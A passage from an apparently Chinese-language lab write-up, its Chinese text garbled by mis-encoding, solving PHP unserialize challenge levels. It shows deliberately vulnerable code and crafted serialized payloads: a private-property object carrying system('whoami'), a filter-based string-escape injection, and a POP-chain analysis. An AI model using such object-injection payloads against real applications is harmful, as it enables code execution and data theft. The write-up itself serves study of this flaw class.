class="hljs-comment">// é™åˆ¶äº†urlç¼–ç çš„å½¢å¼</span><br>unserialize(<span class="hljs-variable">$param</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™å…³æ˜¯ç§æœ‰å±æ€§ååºåˆ—åŒ–</p><p>å½“ç±»ä¸­æœ‰ç§æœ‰å±æ€§æ—¶ï¼Œåœ¨è¿›è¡Œåºåˆ—åŒ–æ“ä½œæ—¶ä¼šåœ¨ç±»åä¸¤è¾¹å‡ºç°ä¸å¯è§çš„å­—ç¬¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># ä¸¾ä¾‹</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pri</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hello world!&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> pri();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>)) . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-comment">// è¾“å‡º</span><br><span class="hljs-comment">// O:3:&quot;pri&quot;:1:&#123;s:8:&quot; pri str&quot;;N;&#125;</span><br><span class="hljs-comment">// O%3A3%3A%22pri%22%3A1%3A%7Bs%3A8%3A%22%00pri%00str%22%3BN%3B%7D</span><br><span class="hljs-comment">// ä¼šåœ¨ç§æœ‰å±æ€§çš„å˜é‡åå‰åå¢åŠ \00</span><br></code></pre></td></tr></table></figure><p>å›åˆ°é¢˜ç›®ï¼Œå…¶å®å°±æ˜¯è€ƒå¯Ÿæ˜¯å¦èƒ½å¤Ÿæ³¨æ„åˆ°ç§æœ‰å±æ€§åœ¨åºåˆ—åŒ–ä¹‹åçš„é‚£ä¸¤ä¸ªä¸å¯è§å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$comm</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$com</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;comm = <span class="hljs-variable">$com</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> secret(<span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// è¾“å‡º O:6:&quot;secret&quot;:1:&#123;s:12:&quot; secret comm&quot;;s:17:&quot;system(&quot;whoami&quot;);&quot;;&#125;  æ³¨æ„ä¸å¯è§å­—ç¬¦</span><br><span class="hljs-comment">// æ›´æ”¹ä¸ºï¼šO:6:\&quot;secret\&quot;:1:&#123;s:12:\&quot;\00secret\00comm\&quot;;s:17:\&quot;system(\&quot;whoami\&quot;);\&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/7.png"></p><h4 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">you</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$body</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$pro</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$project</span>=<span class="hljs-keyword">$this</span>-&gt;pro;<br>        <span class="hljs-keyword">$this</span>-&gt;body-&gt;<span class="hljs-variable">$project</span>();<span class="hljs-comment">// è°ƒç”¨æ–¹æ³•ï¼Œè‹¥bodyä¸ºmyç±»å®ä¾‹åŒ–åçš„å¯¹è±¡ï¼Œè€Œ$projectåˆä¸æ˜¯myç±»ä¸­çš„æ–¹æ³•</span><br>    &#125;<span class="hljs-comment">// é‚£å°±æˆåŠŸè§¦å‘__call()ï¼Œå¹¶ä¸”$projectä¹Ÿå°†ä½œä¸º__call()çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">my</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>)// åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> == <span class="hljs-string">&#x27;yourname&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">$this</span>-&gt;name == <span class="hljs-string">&#x27;myname&#x27;</span>) &#123;<span class="hljs-comment">// æœ€ç»ˆç›®çš„æ‰“å°flag</span><br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>unserialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>__call()</code>è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨æˆ–è€…æ— æ³•è®¿é—®çš„æ–¹æ³•æ—¶ï¼Œä¼šè§¦å‘å¹¶ä¸”æ‰§è¡Œ<code>__call()</code>ï¼Œå¦‚æœæœ‰è¯¥å‡½æ•°çš„æƒ…å†µä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">you</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$body</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$pro</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;body = <span class="hljs-keyword">new</span> my();<br>        <span class="hljs-keyword">$this</span>-&gt;pro = <span class="hljs-string">&#x27;yourname&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$project</span>=<span class="hljs-keyword">$this</span>-&gt;pro;<br>        <span class="hljs-keyword">$this</span>-&gt;body-&gt;<span class="hljs-variable">$project</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">my</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;myname&#x27;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> == <span class="hljs-string">&#x27;yourname&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">$this</span>-&gt;name == <span class="hljs-string">&#x27;myname&#x27;</span>) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> you();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$p</span>);<br><span class="hljs-comment">// è¾“å‡º:O:3:&quot;you&quot;:2:&#123;s:9:&quot; you body&quot;;O:2:&quot;my&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;myname&quot;;&#125;s:8:&quot; you pro&quot;;s:8:&quot;yourname&quot;;&#125;</span><br><span class="hljs-comment">// æ›´æ”¹ä¸ºï¼šO:3:\&quot;you\&quot;:2:&#123;s:9:\&quot;\00you\00body\&quot;;O:2:\&quot;my\&quot;:1:&#123;s:4:\&quot;name\&quot;;s:6:\&quot;myname\&quot;;&#125;s:8:\&quot;\00you\00pro\&quot;;s:8:\&quot;yourname\&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/8.png"></p><h4 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># æºç </span><br><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>    <span class="hljs-variable">$safe</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;php&quot;</span>);<br>    <span class="hljs-variable">$name</span>=str_replace(<span class="hljs-variable">$safe</span>,<span class="hljs-string">&quot;hack&quot;</span>,<span class="hljs-variable">$name</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$name</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;daydream&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$param</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>];<br><span class="hljs-variable">$profile</span>=unserialize(filter(<span class="hljs-variable">$param</span>));<br>var_dump(<span class="hljs-variable">$profile</span>);<br>var_dump(<span class="hljs-variable">$profile</span>-&gt;pass==<span class="hljs-string">&#x27;escaping&#x27;</span>);<span class="hljs-comment">// è¦æ±‚$pass==escapingï¼Œä½†$passçš„å€¼åˆæ— æ³•æ›´æ”¹</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$profile</span>-&gt;pass==<span class="hljs-string">&#x27;escaping&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™å…³æ˜¯å¢é€ƒé€¸</p><p>ç®€å•ç‚¹è¯´å°±æ˜¯åˆ©ç”¨åºåˆ—åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼ä»¥åŠ<code>filter()</code>æ¥å®ç°æ»¡è¶³ç¨‹åºæˆ–ä»£ç çš„è¦æ±‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># ä¸¾ä¸ªä¾‹å­</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$act</span>=<span class="hljs-string">&#x27;111&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> a;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// è¾“å‡º:O:1:&quot;a&quot;:1:&#123;s:3:&quot;act&quot;;s:3:&quot;111&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/9.png"></p><p>åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œ<code>unserialize()</code>æ˜¯æ ¹æ®è¿™äº›å­—ç¬¦çš„ç‰¹æ®Šå«ä¹‰å»è¿›è¡Œååºåˆ—åŒ–ï¼Œå‡å¦‚æŠŠ<strong>ä»£è¡¨å±æ€§å€¼é•¿åº¦çš„å­—ç¬¦ä¸²æ›´æ”¹ä¸ºå˜å¤§æˆ–è€…å˜å°çš„</strong>æˆ–æ˜¯<strong>å°†å±æ€§å€¼è¿›è¡Œå¢é•¿æˆ–ç¼©çŸ­</strong>ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°<strong>å¢é€ƒé€¸</strong>æˆ–<strong>å‡é€ƒé€¸</strong></p><p>å›åˆ°é¢˜ç›®ï¼Œ<code>filter()</code>å‡½æ•°å°†<code>flag</code>æˆ–<code>php</code>æ›´æ”¹ä¸º<code>hack</code>ï¼Œå› ä¸º<code>flag</code>å’Œ<code>hack</code>é•¿åº¦ç›¸åŒï¼Œæ‰€ä»¥è¿™é‡Œé€‰ç”¨<code>php</code>è¿›è¡Œå¢é€ƒé€¸(å› ä¸º<code>php</code>å˜æˆ<code>hack</code>æ—¶é•¿åº¦å¢åŠ 1)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;daydream&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> test(<span class="hljs-string">&#x27;x&#x27;</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// è¾“å‡º:O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:1:&quot;x&quot;;s:4:&quot;pass&quot;;s:8:&quot;daydream&quot;;&#125;</span><br><span class="hljs-comment">// åƒæ‰  &quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;  æ›¿æ¢ä¸º&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;      è¯¥æ®µé•¿åº¦ä¸º29</span><br><span class="hljs-comment">// ä¹Ÿå°±æ˜¯éœ€è¦å°†xæ›´æ”¹ä¸º29ä¸ªphpå†åŠ ä¸Š&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</span><br><br><span class="hljs-comment"># æ›´æ”¹ä»£ç ä¸º</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;daydream&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$flag</span> = <span class="hljs-keyword">new</span> test(<span class="hljs-string">&#x27;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&#x27;</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$flag</span>);<br><span class="hljs-comment">// è¾“å‡º O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:116:&quot;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:8:&quot;daydream&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/10.png"></p><h4 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h4><p>è¿™å…³å°±å¼€å§‹æ„é€ popé“¾äº†ï¼Œå…ˆçœ‹ä¸€ä¸‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)      // è¯¥å‡½æ•°ä¸ºæœ€åä¸€æ­¥</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<span class="hljs-comment">// åŒ…å«flag.phpæ–‡ä»¶ï¼Œ$valueä¹Ÿå°±æ˜¯flag.php</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<span class="hljs-comment">// æ‰“å°flagï¼Œæœ€ç»ˆç›®çš„</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;     <span class="hljs-comment">// å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ï¼Œéœ€è¦$var = flag.php   å€’æ•°ç¬¬äºŒæ­¥</span><br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">// å€’æ•°ç¬¬å››æ­¥ï¼ŒæŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘  </span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;<span class="hljs-comment">// è‹¥$strä¸ºç±»Testå®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œè€Œ$sourceä¸ºä¸€ä¸ªä¸å¯è®¿é—®çš„å±æ€§ï¼Œåˆ™è°ƒç”¨__get()</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">// ååºåˆ—åŒ–çš„å…¥å£</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;source;<span class="hljs-comment">// è‹¥$sourceä¸ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œåˆ™è°ƒç”¨__toString()</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<span class="hljs-comment">// ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®æˆ–è€…ä¸å­˜åœ¨è¿™ä¸ªé”®éƒ½ä¼šè°ƒç”¨æ­¤æ–¹æ³•  </span><br>        <span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<span class="hljs-comment">// è‹¥$function = class Modifier,åˆ™è§¦å‘__invoke()å€’æ•°ç¬¬ä¸‰æ­¥</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;    <span class="hljs-comment">// æ£€æµ‹æ˜¯å¦ä¸ºç©º</span><br>    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>okï¼Œåˆ†æå®Œäº†ï¼Œæ‹ä¸€ä¸‹æ€è·¯</p><ol><li><code>__wake()</code>ä½œä¸ºå…¥å£ï¼Œå»è°ƒç”¨<code>__toString()</code>ï¼šè¦æ±‚<code>$source</code>ä¸ºç±»<code>Show</code>å®ä¾‹åŒ–åçš„å¯¹è±¡</li><li><code>__toString()</code>ä½œä¸ºç¬¬äºŒæ­¥ï¼Œå»è°ƒç”¨<code>__get()</code>ï¼šè¦æ±‚<code>$str</code>ä¸ºç±»<code>Test</code>å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œè€Œ<code>$source</code>ä¸ºä¸€ä¸ªä¸å¯è®¿é—®çš„å±æ€§</li><li><code>__get($key)</code>ä½œä¸ºç¬¬ä¸‰æ­¥ï¼Œå»è°ƒç”¨<code>__invoke()</code>ï¼š<code>$function</code>ä¹Ÿå°±æ˜¯<code>public $p</code>ä¸ºç±»<code>Modifier</code>å®ä¾‹åŒ–åçš„å¯¹è±¡</li><li><code>__invoke()</code>ä½œä¸ºç¬¬å››æ­¥ï¼Œå»è°ƒç”¨<code>append()</code>:è¦æ±‚<code>private $var;</code>çš„å€¼ä¸º<code>flag.php</code></li><li><code>append()</code>ä½œä¸ºæœ€åä¸€æ­¥ï¼Œæ‰“å°å‡º<code>flag</code></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 